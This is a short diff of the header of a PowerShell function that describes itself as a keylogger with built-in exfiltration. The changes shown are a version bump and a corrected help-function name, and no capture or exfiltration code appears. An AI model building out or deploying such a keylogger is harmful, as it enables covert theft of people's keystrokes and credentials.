@@ -1,7 +1,7 @@
 ﻿function Capture-Keys {
 #.SYNOPSIS
 # PowerShell-based Keylogger with built-in Exfiltration
-# ARBITRARY VERSION NUMBER:  1.0.0
+# ARBITRARY VERSION NUMBER:  1.0.1
 # AUTHOR:  Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -26,7 +26,7 @@
 
 
     # Return Get-Help Information
-    if ($Help) { return (Get-Help Capture-KeysNG) }
+    if ($Help) { return (Get-Help Capture-Keys) }
 
 
     # Error Correction
